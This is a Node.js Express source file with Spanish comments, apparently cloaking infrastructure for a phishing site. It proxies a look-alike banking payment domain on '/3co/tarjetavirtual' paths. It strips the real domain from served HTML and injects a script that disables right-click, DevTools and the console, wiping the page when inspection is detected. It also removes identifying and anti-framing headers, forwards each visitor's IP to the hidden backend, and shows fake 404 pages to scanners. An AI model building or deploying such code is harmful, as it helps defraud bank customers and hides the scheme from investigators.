const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const helmet = require('helmet');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const TARGET_URL = process.env.TARGET_URL || 'https://pse.pwm435.space';
const ALLOWED_PATHS = ['/3co', '/3co/tarjetavirtual'];

// Seguridad adicional
app.use(helmet({
    contentSecurityPolicy: false,
    crossOriginEmbedderPolicy: false
}));

// Eliminar headers que revelan información
app.use((req, res, next) => {
    res.removeHeader('X-Powered-By');
    res.removeHeader('Server');
    next();
});

// Función para ofuscar URLs en el contenido
const obfuscateContent = (content, contentType) => {
    if (!contentType || !contentType.includes('text/html')) {
        return content;
    }
    
    // Reemplazar referencias al dominio real
    let modified = content.toString('utf8');
    modified = modified.replace(/https?:\/\/[^\/\s"']+/g, (match) => {
        if (match.includes('render.com')) return match;
        return '';
    });
    
    // Inyectar script para prevenir inspección
    const antiInspectScript = `
    <script>
    (function(){
        // Deshabilitar click derecho
        document.addEventListener('contextmenu', e => e.preventDefault());
        
        // Deshabilitar F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
        document.addEventListener('keydown', e => {
            if(e.keyCode === 123 || 
               (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
               (e.ctrlKey && e.keyCode === 85)) {
                e.preventDefault();
                return false;
            }
        });
        
        // Detectar DevTools
        let devtools = {open: false, orientation: null};
        setInterval(() => {
            if(window.outerHeight - window.innerHeight > 200 || 
               window.outerWidth - window.innerWidth > 200) {
                if(!devtools.open) {
                    devtools.open = true;
                    document.body.innerHTML = '';
                    window.location.href = '/';
                }
            } else {
                devtools.open = false;
            }
        }, 500);
        
        // Ofuscar console
        Object.defineProperty(console, 'log', {
            value: function() {},
            writable: false,
            configurable: false
        });
    })();
    </script>
    `;
    
    if (modified.includes('</body>')) {
        modified = modified.replace('</body>', antiInspectScript + '</body>');
    }
    
    return Buffer.from(modified);
};

// Middleware para verificar rutas permitidas
app.use((req, res, next) => {
    const path = req.path;
    const isAllowed = ALLOWED_PATHS.some(allowedPath => 
        path === allowedPath || path.startsWith(allowedPath + '/')
    );
    
    if (!isAllowed && !path.startsWith('/assets') && !path.startsWith('/css') && !path.startsWith('/js')) {
        // Respuesta genérica para rutas no permitidas
        res.status(404).send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>404 Not Found</title>
                <style>
                    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
                    h1 { color: #333; }
                </style>
            </head>
            <body>
                <h1>404 - Page Not Found</h1>
                <p>The requested resource could not be found.</p>
            </body>
            </html>
        `);
        return;
    }
    next();
});

// Configuración del proxy
const proxyOptions = {
    target: TARGET_URL,
    changeOrigin: true,
    secure: true,
    followRedirects: true,
    
    // Modificar request
    onProxyReq: (proxyReq, req, res) => {
        // Agregar headers personalizados
        const userDomain = req.get('host') || 'unknown.onrender.com';
        const userIp = req.headers['x-forwarded-for'] || 
                      req.headers['x-real-ip'] || 
                      req.connection.remoteAddress || 
                      'unknown';
        
        proxyReq.setHeader('user_domain', userDomain);
        proxyReq.setHeader('user_ip', userIp.split(',')[0].trim());
        
        // Eliminar headers que pueden revelar el proxy
        proxyReq.removeHeader('x-forwarded-for');
        proxyReq.removeHeader('x-forwarded-host');
        proxyReq.removeHeader('x-forwarded-proto');
        
        // Agregar headers para parecer un navegador real
        proxyReq.setHeader('User-Agent', req.get('User-Agent') || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        proxyReq.setHeader('Accept-Language', 'es-ES,es;q=0.9,en;q=0.8');
        
        // *** Cambio clave: no pedir compresión al backend ***
        // Antes se usaba 'gzip, deflate, br' y luego se reescribía el cuerpo HTML.
        // Para evitar ERR_CONTENT_DECODING_FAILED, pedimos contenido sin comprimir.
        proxyReq.setHeader('Accept-Encoding', 'identity');

        // Generar un ID único de sesión ofuscado
        const sessionId = crypto.randomBytes(16).toString('hex');
        proxyReq.setHeader('X-Session-Id', sessionId);
    },
    
    // Modificar response
    onProxyRes: (proxyRes, req, res) => {
        // Eliminar headers que revelan información del servidor real
        delete proxyRes.headers['x-powered-by'];
        delete proxyRes.headers['server'];
        delete proxyRes.headers['x-aspnet-version'];
        delete proxyRes.headers['x-aspnetmvc-version'];
        delete proxyRes.headers['x-frame-options'];

        // *** Cambio clave: si vamos a reescribir el cuerpo, no debe haber Content-Encoding ***
        // (el backend podría haberlo puesto por defecto; lo forzamos a ausente)
        delete proxyRes.headers['content-encoding'];
        
        // Agregar headers de seguridad
        proxyRes.headers['X-Content-Type-Options'] = 'nosniff';
        proxyRes.headers['X-XSS-Protection'] = '1; mode=block';
        proxyRes.headers['Referrer-Policy'] = 'no-referrer';
        proxyRes.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, private';
        
        // Modificar el contenido HTML
        const contentType = proxyRes.headers['content-type'];
        if (contentType && contentType.includes('text/html')) {
            const originalWrite = res.write;
            const originalEnd = res.end;
            const chunks = [];
            
            res.write = function(chunk) {
                chunks.push(Buffer.from(chunk));
                return true;
            };
            
            res.end = function(chunk) {
                if (chunk) chunks.push(Buffer.from(chunk));
                const body = Buffer.concat(chunks);
                const modifiedBody = obfuscateContent(body, contentType);
                
                // Actualizar content-length acorde al nuevo cuerpo
                proxyRes.headers['content-length'] = Buffer.byteLength(modifiedBody);
                // Asegurar que no se envíe transfer-encoding conflictivo
                delete proxyRes.headers['transfer-encoding'];
                
                res.write = originalWrite;
                res.end = originalEnd;
                res.end(modifiedBody);
            };
        }
    },
    
    // Manejo de errores
    onError: (err, req, res) => {
        console.error('Proxy error:', err.message);
        res.status(502).send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Service Temporarily Unavailable</title>
                <style>
                    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
                    h1 { color: #333; }
                </style>
            </head>
            <body>
                <h1>Service Temporarily Unavailable</h1>
                <p>Please try again later.</p>
            </body>
            </html>
        `);
    }
};

// Aplicar el proxy
app.use('/', createProxyMiddleware(proxyOptions));

// Manejo de errores global
app.use((err, req, res, next) => {
    console.error('Application error:', err);
    res.status(500).send('Internal Server Error');
});

app.listen(PORT, () => {
    console.log(`Proxy server running on port ${PORT}`);
    console.log('Allowed paths:', ALLOWED_PATHS.join(', '));
});
